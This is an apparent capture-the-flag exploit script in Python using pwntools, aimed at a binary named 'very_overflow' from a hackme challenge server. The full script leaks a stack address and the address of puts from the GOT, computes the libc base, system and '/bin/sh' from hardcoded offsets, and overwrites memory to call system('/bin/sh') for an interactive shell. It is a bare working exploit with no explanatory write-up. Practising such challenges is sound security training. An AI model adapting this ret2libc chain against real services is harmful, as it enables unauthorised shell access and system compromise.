from pwn import *
context.log_level = 'debug'
p = process('./very_overflow',env = {"LD_PRELOAD":"../libc-2.23.so.i386"})
#p = remote('hackme.inndy.tw',7705)
elf = ELF('./very_overflow')

def add(data):
	p.sendlineafter('action: ','1')
	p.sendlineafter('note: ',data)

def edit(id,data):
	p.sendlineafter('action: ','2')
	p.sendlineafter('edit: ',str(id))
	p.sendlineafter('data: ',data)

def show(id):
	p.sendlineafter('action: ','3')
	p.sendlineafter('show: ',str(id))

def dump():
	p.sendlineafter('action: ','4')

def exit():
	p.sendlineafter('action: ','5')

#leak stack addr
add('aa')
show(0)
p.recvuntil('note: ')
stack_addr = int(p.recvuntil('\n',drop = True),16)
rop_addr = stack_addr + 0x4204
#gdb.attach(p)
edit(0,'bbbb' + p32(elf.got['puts']))
show(2)

#leak libc
p.recvuntil('note: ')
puts_addr = int(p.recvuntil('\n',drop = True),16)
offset_puts = 0x0005fb80
offset_system = 0x0003ad80
offset_str_bin_sh = 0x15ba3f
libc_base = puts_addr - offset_puts
log.success('libc base addr : 0x%x'%libc_base)
system_addr = libc_base + offset_system
binsh_addr = libc_base + offset_str_bin_sh
log.success('system addr : 0x%x'%system_addr)
log.success('binsh addr : 0x%x'%binsh_addr)


#rop system('/bin/sh')
edit(0,'bbbb' + p32(rop_addr))
payload = p32(system_addr) + 'bbbb' + p32(binsh_addr)
edit(2,payload)
exit()

p.interactive()